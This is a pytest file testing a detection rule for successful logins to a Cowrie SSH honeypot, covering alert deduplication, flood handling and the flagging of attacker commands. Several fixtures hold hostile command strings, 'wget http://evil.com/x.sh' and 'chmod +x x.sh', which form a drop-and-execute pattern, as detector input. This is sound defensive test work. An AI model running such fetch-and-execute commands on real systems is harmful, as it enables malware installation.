from rules.rule_015_cowrie_login import detect
from datetime import datetime, timezone


def test_cowrie_login_success_fires_critical(
    make_cowrie_session, make_login_attempt
):
    """One successful login -> one CRITICAL alert."""
    attempt = make_login_attempt(success=True, username="admin", password="admin")
    session = make_cowrie_session(login_attempts=[attempt])

    alerts = detect([session])
    assert len(alerts) == 1
    assert alerts[0].severity.name == "CRITICAL"
    assert alerts[0].source_ip == session.src_ip


def test_cowrie_login_no_success_no_alert(
    make_cowrie_session, make_login_attempt
):
    """Only failed attempts, no success -> no alert. Pure recon/scan
    bot noise is intentionally not surfaced on the dashboard."""
    failed = make_login_attempt(success=False)
    session = make_cowrie_session(login_attempts=[failed])

    alerts = detect([session])
    assert alerts == []


def test_cowrie_login_same_ip_same_day_is_one_alert(
    make_cowrie_session, make_login_attempt
):
    """Two sessions from the same IP on the same UTC day -> ONE alert.
    dedup_key is '<ip>|<date>' (same shape as rule_001) so engine.py's
    deduplicate_alerts() also keeps one per day across engine runs."""
    session1 = make_cowrie_session(
        session_id="sessA", login_attempts=[make_login_attempt(session_id="sessA")]
    )
    session2 = make_cowrie_session(
        session_id="sessB", login_attempts=[make_login_attempt(session_id="sessB")]
    )

    alerts = detect([session1, session2])
    assert len(alerts) == 1
    assert alerts[0].dedup_key == "45.33.32.156|2026-01-15"
    assert alerts[0].extra["session_count"] == 2


def test_cowrie_login_different_ips_get_separate_alerts(
    make_cowrie_session, make_login_attempt
):
    """The IP is part of the key: two attackers must never suppress each other."""
    session1 = make_cowrie_session(
        session_id="sessA", src_ip="45.33.32.156",
        login_attempts=[make_login_attempt(session_id="sessA")],
    )
    session2 = make_cowrie_session(
        session_id="sessB", src_ip="8.137.150.84",
        login_attempts=[make_login_attempt(session_id="sessB")],
    )

    alerts = detect([session1, session2])
    assert len(alerts) == 2
    assert {a.dedup_key for a in alerts} == {
        "45.33.32.156|2026-01-15", "8.137.150.84|2026-01-15",
    }


def test_cowrie_login_same_ip_different_days_get_separate_alerts(
    make_cowrie_session, make_login_attempt
):
    """A bot that returns the next day is news again: new UTC date, new alert."""
    day1 = make_login_attempt(
        session_id="sessA", timestamp=datetime(2026, 1, 15, 10, 0, 0, tzinfo=timezone.utc)
    )
    day2 = make_login_attempt(
        session_id="sessB", timestamp=datetime(2026, 1, 16, 10, 0, 0, tzinfo=timezone.utc)
    )
    alerts = detect([
        make_cowrie_session(session_id="sessA", login_attempts=[day1]),
        make_cowrie_session(session_id="sessB", login_attempts=[day2]),
    ])
    assert [a.dedup_key for a in alerts] == [
        "45.33.32.156|2026-01-15", "45.33.32.156|2026-01-16",
    ]


def test_cowrie_login_utc_midnight_splits_group(
    make_cowrie_session, make_login_attempt
):
    """Sessions 20 seconds apart but on either side of UTC midnight land in
    different days -> two alerts. Documents the (accepted) edge case."""
    before = make_login_attempt(
        session_id="sessA", timestamp=datetime(2026, 1, 15, 23, 59, 50, tzinfo=timezone.utc)
    )
    after = make_login_attempt(
        session_id="sessB", timestamp=datetime(2026, 1, 16, 0, 0, 10, tzinfo=timezone.utc)
    )
    alerts = detect([
        make_cowrie_session(session_id="sessA", login_attempts=[before]),
        make_cowrie_session(session_id="sessB", login_attempts=[after]),
    ])
    assert len(alerts) == 2


def test_cowrie_login_flood_collapses_to_one_alert(
    make_cowrie_session, make_login_attempt
):
    """The 2026-11-13 incident in miniature: 500 sessions from one IP in one
    batch -> ONE alert, saying 'at least 500', flagged as a lower bound."""
    sessions = [
        make_cowrie_session(
            session_id=f"flood{n}",
            src_ip="8.137.150.84",
            login_attempts=[make_login_attempt(session_id=f"flood{n}")],
        )
        for n in range(500)
    ]

    alerts = detect(sessions)
    assert len(alerts) == 1
    assert alerts[0].extra["session_count"] == 500
    assert alerts[0].extra["count_is_lower_bound"] is True
    assert "at least 500 session(s)" in alerts[0].description
    assert alerts[0].severity.name == "CRITICAL"


def test_cowrie_login_failed_only_sessions_not_counted(
    make_cowrie_session, make_login_attempt
):
    """A session with no successful login must not inflate the count or
    create an alert of its own — only successes are 'got in'."""
    ok1 = make_cowrie_session(
        session_id="ok1", login_attempts=[make_login_attempt(session_id="ok1")]
    )
    ok2 = make_cowrie_session(
        session_id="ok2", login_attempts=[make_login_attempt(session_id="ok2")]
    )
    failed = make_cowrie_session(
        session_id="bad",
        login_attempts=[make_login_attempt(session_id="bad", success=False)],
    )

    alerts = detect([ok1, failed, ok2])
    assert len(alerts) == 1
    assert alerts[0].extra["session_count"] == 2


def test_cowrie_login_merges_flags_and_sums_counts_across_batch(
    make_cowrie_session, make_login_attempt, make_cowrie_command
):
    """Within one batch: wget in session A and chmod +x in session B both
    show on the single alert; attempt and command counts are summed."""
    session_a = make_cowrie_session(
        session_id="A",
        login_attempts=[
            make_login_attempt(session_id="A", success=False),
            make_login_attempt(session_id="A", success=True),
        ],
        commands=[make_cowrie_command(session_id="A", input="wget http://evil.com/x.sh")],
    )
    session_b = make_cowrie_session(
        session_id="B",
        login_attempts=[make_login_attempt(session_id="B", success=True)],
        commands=[
            make_cowrie_command(session_id="B", input="chmod +x x.sh"),
            make_cowrie_command(session_id="B", input="ls"),
        ],
    )

    alerts = detect([session_a, session_b])
    assert len(alerts) == 1
    extra = alerts[0].extra
    assert extra["download_tools"] == ["wget"]
    assert extra["chmod_x_used"] is True
    assert extra["login_attempt_count"] == 3
    assert extra["command_count"] == 3


def test_cowrie_login_time_window_spans_the_group(
    make_cowrie_session, make_login_attempt
):
    """first_seen = earliest success in the group, last_seen = latest session end."""
    early = make_login_attempt(
        session_id="early", timestamp=datetime(2026, 1, 15, 8, 0, 0, tzinfo=timezone.utc)
    )
    late = make_login_attempt(
        session_id="late", timestamp=datetime(2026, 1, 15, 20, 0, 0, tzinfo=timezone.utc)
    )
    session_early = make_cowrie_session(session_id="early", login_attempts=[early])
    session_late = make_cowrie_session(session_id="late", login_attempts=[late]).model_copy(
        update={"end_time": datetime(2026, 1, 15, 20, 5, 0, tzinfo=timezone.utc)}
    )

    alerts = detect([session_early, session_late])
    assert alerts[0].first_seen == datetime(2026, 1, 15, 8, 0, 0, tzinfo=timezone.utc)
    assert alerts[0].last_seen == datetime(2026, 1, 15, 20, 5, 0, tzinfo=timezone.utc)


def test_cowrie_login_input_order_does_not_change_the_alert(
    make_cowrie_session, make_login_attempt
):
    """The 'first' session is chosen by timestamp, not list position, so the
    same data in any order gives the same credentials and first_session_id."""
    early = make_login_attempt(
        session_id="early", username="root", password="toor",
        timestamp=datetime(2026, 1, 15, 8, 0, 0, tzinfo=timezone.utc),
    )
    late = make_login_attempt(
        session_id="late", username="admin", password="admin",
        timestamp=datetime(2026, 1, 15, 9, 0, 0, tzinfo=timezone.utc),
    )
    session_early = make_cowrie_session(session_id="early", login_attempts=[early])
    session_late = make_cowrie_session(session_id="late", login_attempts=[late])

    forward = detect([session_early, session_late])[0]
    backward = detect([session_late, session_early])[0]
    assert forward.username == backward.username == "root"
    assert forward.extra["first_session_id"] == backward.extra["first_session_id"] == "early"


def test_cowrie_login_multiple_attempts_one_alert(
    make_cowrie_session, make_login_attempt
):
    """3 failed attempts then 1 success, all in one session -> still just
    ONE alert (per-session dedup), not one per attempt. This is the whole
    point of session-level dedup — bot brute-forcing the honeypot doesn't
    flood alerts.json."""
    attempts = [
        make_login_attempt(success=False, password="123"),
        make_login_attempt(success=False, password="password"),
        make_login_attempt(success=False, password="admin123"),
        make_login_attempt(success=True, password="letmein"),
    ]
    session = make_cowrie_session(login_attempts=attempts)

    alerts = detect([session])
    assert len(alerts) == 1
    assert alerts[0].extra["login_attempt_count"] == 4


def test_cowrie_login_reports_first_success_not_last(
    make_cowrie_session, make_login_attempt
):
    """If somehow multiple successes exist in one session, alert reports
    the FIRST success's credentials, not the last."""
    first = make_login_attempt(
        success=True, username="root", password="toor",
        timestamp=datetime(2026, 1, 15, 10, 30, 0, tzinfo=timezone.utc),
    )
    second = make_login_attempt(
        success=True, username="admin", password="admin",
        timestamp=datetime(2026, 1, 15, 10, 31, 0, tzinfo=timezone.utc),
    )
    session = make_cowrie_session(login_attempts=[first, second])

    alerts = detect([session])
    assert len(alerts) == 1
    assert "root" in alerts[0].description


def test_cowrie_download_tools_detected(
    make_cowrie_session, make_login_attempt, make_cowrie_command
):
    """wget in the command stream -> shows up in extra['download_tools']."""
    attempt = make_login_attempt(success=True)
    cmd1 = make_cowrie_command(input="wget http://evil.com/x.sh")
    cmd2 = make_cowrie_command(input="whoami")
    session = make_cowrie_session(
        login_attempts=[attempt], commands=[cmd1, cmd2]
    )

    alerts = detect([session])
    assert alerts[0].extra["download_tools"] == ["wget"]


def test_cowrie_download_tools_word_boundary_not_substring(
    make_cowrie_session, make_login_attempt, make_cowrie_command
):
    """'wget' appearing inside an unrelated word must NOT match — this is
    the false-positive case word-boundary regex was chosen to avoid."""
    attempt = make_login_attempt(success=True)
    cmd = make_cowrie_command(input="echo notwgetreally")
    session = make_cowrie_session(login_attempts=[attempt], commands=[cmd])

    alerts = detect([session])
    assert alerts[0].extra["download_tools"] == []


def test_cowrie_chmod_x_detected_separately_from_download_tools(
    make_cowrie_session, make_login_attempt, make_cowrie_command
):
    """chmod +x is tracked as its own boolean, not mixed into
    download_tools — download (acquisition) and chmod (preparation) are
    different stages of the drop-and-execute pattern."""
    attempt = make_login_attempt(success=True)
    cmd1 = make_cowrie_command(input="wget http://evil.com/x.sh")
    cmd2 = make_cowrie_command(input="chmod +x x.sh")
    session = make_cowrie_session(
        login_attempts=[attempt], commands=[cmd1, cmd2]
    )

    alerts = detect([session])
    assert alerts[0].extra["download_tools"] == ["wget"]
    assert alerts[0].extra["chmod_x_used"] is True


def test_cowrie_no_tools_no_chmod_when_absent(
    make_cowrie_session, make_login_attempt, make_cowrie_command
):
    """Session with only benign-looking commands -> empty tools, chmod False."""
    attempt = make_login_attempt(success=True)
    cmd = make_cowrie_command(input="ls -la")
    session = make_cowrie_session(login_attempts=[attempt], commands=[cmd])

    alerts = detect([session])
    assert alerts[0].extra["download_tools"] == []
    assert alerts[0].extra["chmod_x_used"] is False


def test_cowrie_no_sessions_no_alerts():
    """Empty input list -> empty output, no crash."""
    assert detect([]) == []
